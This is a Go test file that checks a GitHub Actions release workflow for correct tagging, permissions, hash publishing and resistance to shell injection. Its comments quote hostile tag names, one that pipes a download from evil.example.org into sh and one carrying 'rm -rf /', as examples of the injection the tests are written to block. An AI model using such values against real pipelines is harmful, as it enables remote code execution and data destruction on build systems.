package deploy

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// The publication workflow is guarded here because its failures are silent.
//
// A release that goes out under the wrong name, or without the freshly built screen, looks
// exactly like a release that went out right: the archive exists, it installs, and the
// mistake surfaces months later when somebody asks what version a station is running.
// Nothing else in this repository reads .github/workflows/release.yml.
//
// The file is read as TEXT rather than parsed as YAML, and deliberately: parsing it would
// add a dependency to a repository whose whole shape comes from refusing them, for
// assertions that are about the presence of four lines.

// releaseWorkflow is the workflow that publishes a version.
const releaseWorkflow = "../.github/workflows/release.yml"

// readWorkflow returns the publication workflow with its COMMENTS REMOVED.
//
// codeOnly is not a nicety here, it is what makes these tests bite. Every line of that
// workflow explains itself in a comment right above — « fetch-depth: 0 EST OBLIGATOIRE
// ICI » — so a naive search finds the word in the explanation and passes even after the
// directive itself has been deleted. That is exactly what happened while writing this
// file: removing fetch-depth: 0 turned nothing red, because the comment mentioning it was
// still there. The sibling tests of deploy_test.go had already met the trap.
func readWorkflow(t *testing.T) string {
	t.Helper()
	raw, err := os.ReadFile(filepath.Clean(releaseWorkflow))
	if err != nil {
		t.Fatalf("lecture de %s : %v", releaseWorkflow, err)
	}
	return codeOnly(string(raw))
}

// TestTheReleaseWorkflowFetchesTheTags is the trap that costs a wrongly named release.
//
// actions/checkout makes a SHALLOW clone with no tags. The version of every archive comes
// from `git describe --tags` in the Makefile, so without fetch-depth: 0 it answers with a
// revision number: the Release is called 2.0.0 and carries
// openscale-a1b2c3d-windows-amd64.zip. Nothing fails, nothing warns, and six months later
// nobody can say what that version contained.
func TestTheReleaseWorkflowFetchesTheTags(t *testing.T) {
	workflow := readWorkflow(t)
	if !strings.Contains(workflow, "fetch-depth: 0") {
		t.Error("release.yml ne demande pas fetch-depth: 0 — le clone serait superficiel " +
			"et sans tags, donc `git describe --tags` rendrait un numéro de révision et " +
			"les archives ne porteraient pas la version publiée")
	}
	// The guard that catches it anyway, in case the fetch ever regresses: the workflow
	// compares the tag against the file names before publishing.
	if !strings.Contains(workflow, "Le nom des archives porte bien la version") {
		t.Error("release.yml ne vérifie plus que le nom des archives porte le tag : " +
			"c'est le filet qui rattrape un clone sans tags")
	}
}

// TestTheReleaseWorkflowRebuildsTheClientScreen guards the hardest failure to believe.
//
// internal/web/dist is committed so that `go build` works on a machine with no Node
// (§14.1). It is therefore a CACHE, and nothing guarantees it matches the sources of the
// tag. A release that shipped a screen from three commits ago would have a correct binary
// and an incorrect screen — and the person debugging it would read the Go code.
func TestTheReleaseWorkflowRebuildsTheClientScreen(t *testing.T) {
	workflow := readWorkflow(t)
	front := strings.Index(workflow, "make front")
	release := strings.Index(workflow, "make release")
	switch {
	case front < 0:
		t.Error("release.yml ne construit pas l'écran client : la version embarquerait le " +
			"internal/web/dist commité, dont rien ne garantit qu'il corresponde au tag")
	case release < 0:
		t.Error("release.yml ne fabrique aucune archive")
	case front > release:
		t.Error("release.yml construit l'écran APRÈS les archives : elles emporteraient " +
			"l'écran précédent")
	}
}

// TestTheReleaseWorkflowMayWriteAndOnlyIt: publishing needs contents: write, and that is
// the only elevated permission of this repository. The CI next door stays read-only, and
// the two must not drift into each other.
func TestTheReleaseWorkflowMayWriteAndOnlyIt(t *testing.T) {
	if got := readWorkflow(t); !strings.Contains(got, "contents: write") {
		t.Error("release.yml ne demande pas contents: write : la publication échouerait")
	}
	ci, err := os.ReadFile(filepath.Clean("../.github/workflows/ci.yml"))
	if err != nil {
		t.Fatalf("lecture de ci.yml : %v", err)
	}
	if strings.Contains(codeOnly(string(ci)), "contents: write") {
		t.Error("ci.yml demande contents: write : l'intégration continue tourne sur les " +
			"pull requests, y compris celles d'un contributeur extérieur, et n'a aucune " +
			"raison de pouvoir écrire dans le dépôt")
	}
}

// TestTheReleaseWorkflowTriggersOnVersionTagsOnly: a working tag must not publish.
//
// `git tag banc-de-test` and `git tag avant-migration` are ordinary gestures. If either
// created a Release, the page would fill with things nobody should install.
func TestTheReleaseWorkflowTriggersOnVersionTagsOnly(t *testing.T) {
	workflow := readWorkflow(t)

	// The « v » prefix is the most widespread convention of the git ecosystem, and the
	// first version published from this repository was called v0.1. A filter that only
	// accepted 2.0.0 matched nothing, so no run appeared at all — and a Release with no
	// archives and no failed run is the hardest kind of nothing to diagnose.
	for _, form := range []string{`- "[0-9]*.[0-9]*"`, `- "v[0-9]*.[0-9]*"`} {
		if !strings.Contains(workflow, form) {
			t.Errorf("release.yml n'accepte pas les tags de la forme %s : une version "+
				"posée sous cette forme ne déclencherait rien", form)
		}
	}
	if strings.Contains(workflow, `tags:`) && strings.Contains(workflow, `- "*"`) {
		t.Error("release.yml se déclenche sur n'importe quel tag")
	}
	// A suffixed version is a pre-release, so that a volunteer does not install a release
	// candidate believing it to be an ordinary update.
	if !strings.Contains(workflow, "prerelease:") {
		t.Error("release.yml ne marque pas les versions suffixées comme préversions")
	}
}

// TestTheReleaseWorkflowPublishesTheArchiveHashes: the archive is what gets downloaded,
// and SHA256SUMS inside it covers the files it contains — not itself. Without the hashes
// of the zips, nobody can check what they received.
func TestTheReleaseWorkflowPublishesTheArchiveHashes(t *testing.T) {
	workflow := readWorkflow(t)
	for _, want := range []string{"SHA256SUMS-archives.txt", "dist/*.zip"} {
		if !strings.Contains(workflow, want) {
			t.Errorf("release.yml ne publie pas %q", want)
		}
	}
}

// TestTheReleaseWorkflowNeverInterpolatesIntoAShellLine is the injection this workflow
// would otherwise carry, and it is worth stating plainly.
//
// `${{ … }}` is substituted by GitHub BEFORE the shell reads the line. A tag named
//
//	v1.0"; curl evil.example.org | sh; #
//
// interpolated into `make release VERSION="${{ github.ref_name }}"` becomes a command, and
// workflow_dispatch lets anybody with write access supply one by hand. A git tag name
// accepts almost anything, so the `on: push: tags` glob is no protection either — it
// matches shapes, not character sets.
//
// Passing the value through the ENVIRONMENT closes it: a variable is data the shell
// expands, never a line it parses.
func TestTheReleaseWorkflowNeverInterpolatesIntoAShellLine(t *testing.T) {
	raw, err := os.ReadFile(filepath.Clean(releaseWorkflow))
	if err != nil {
		t.Fatalf("lecture de %s : %v", releaseWorkflow, err)
	}

	// Walked line by line on the RAW file: codeOnly would hide nothing here, and the
	// finding is about the literal text GitHub substitutes.
	inRun := false
	for number, line := range strings.Split(string(raw), "\n") {
		trimmed := strings.TrimSpace(line)
		switch {
		case strings.HasPrefix(trimmed, "run:"):
			inRun = true
		case strings.HasPrefix(trimmed, "- name:"), strings.HasPrefix(trimmed, "- uses:"),
			strings.HasPrefix(trimmed, "env:"), strings.HasPrefix(trimmed, "with:"):
			inRun = false
		}
		if !inRun || !strings.Contains(line, "${{") {
			continue
		}
		t.Errorf("release.yml ligne %d interpole une expression dans du shell :\n  %s\n"+
			"Un nom de tag peut porter des métacaractères, et `${{ }}` est remplacé AVANT "+
			"que le shell ne lise la ligne. Passez la valeur par env: et lisez-la comme "+
			"une variable.", number+1, trimmed)
	}
}

// TestTheReleaseWorkflowValidatesTheTagBeforeAnythingElse: the validation has to come
// FIRST. Placed after the checkout it would still stop the build, but a hostile ref would
// already have been handed to actions/checkout.
func TestTheReleaseWorkflowValidatesTheTagBeforeAnythingElse(t *testing.T) {
	workflow := readWorkflow(t)

	validation := strings.Index(workflow, "Le nom du tag est bien une version")
	checkout := strings.Index(workflow, "actions/checkout")
	build := strings.Index(workflow, "make release")
	switch {
	case validation < 0:
		t.Fatal("release.yml ne valide pas le nom du tag : workflow_dispatch accepte une " +
			"chaîne arbitraire, et le filtre de tags ne couvre pas ce chemin")
	case checkout >= 0 && validation > checkout:
		t.Error("la validation du tag vient APRÈS le checkout : une ref hostile aurait " +
			"déjà été remise à actions/checkout")
	case build >= 0 && validation > build:
		t.Error("la validation du tag vient après la construction")
	}

	// The character class is what actually refuses a metacharacter; the shape alone would
	// accept `v1.0; rm -rf /`.
	if !strings.Contains(workflow, `[0-9]+(\.[0-9]+){1,2}`) {
		t.Error("la validation ne borne pas les CARACTÈRES admis : une forme de version " +
			"seule accepterait v1.0;echo, dont la forme est correcte")
	}
}
